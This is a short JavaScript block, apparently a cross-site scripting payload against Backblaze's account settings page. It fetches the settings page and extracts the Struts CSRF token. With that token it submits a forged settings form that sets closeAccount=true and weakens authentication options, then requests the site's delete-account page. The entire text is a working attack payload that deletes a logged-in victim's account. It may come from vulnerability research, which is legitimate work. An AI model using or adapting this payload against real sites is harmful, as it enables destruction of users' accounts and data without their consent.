<script>
var url = "/account_settings.htm";
var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", url, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
            // Get the csrf token from meta tag
            token = page.getElementsByName('org.apache.struts.taglib.html.TOKEN')[0].value
            // Show the token
            console.log("The token is: " + token);

            var xhr2 = new XMLHttpRequest();
                xhr2.open("POST", "/account_settings.htm", true);     
                xhr2.setRequestHeader("Content-Type", 'application/x-www-form-urlencoded; charset=UTF-8');
                xhr2.send('org.apache.struts.taglib.html.TOKEN='+token+'&originalLangLocale=en_US&signinMethod=never&langLocale=en_US&originalEmailReceipts=false&enabledComputerBackup=on&originalComputerBackup=true&originalB2CloudStorage=false&originalGroups=false&originalEnableSso=false&enableSso=false&oauthSsoProvider=&currentPasswordChangeEmail=&newEmail=&confirmNewEmail=&changeEmail=&currentPassword=&password=&confirmPassword=&changePassword=&currentPasswordChangeSMS=&smsPhoneNumber=&smsSecurityCode%22=&verifiedSmsPhoneNumber=&verifiedSmsCountryCode=&changeSmsPhoneNumber=&current_verify_email=&verifyEmailSecurityCode%22=&authenticate=never&totpVerificationCode=&genBackupCodes=on&authKey=&totpHash=&originalEnabledSmsFallback=false&removePhoneNumber=&closeAccount=true&changeAuthSettings=&authSettings=&authMethod=&smsBackupCodes=');
            
                xhr2.onload = function(e){
                    if( xhr2.readyState == XMLHttpRequest.DONE && xhr2.status == 200 )
                    {
                        var xhr3 = new XMLHttpRequest();
                        xhr3.open("GET", "https://www.backblaze.com/delete-account.html", true);
                        xhr3.send(null);
                    }
                }
        }
    };
    xhr.send(null);
    </script>
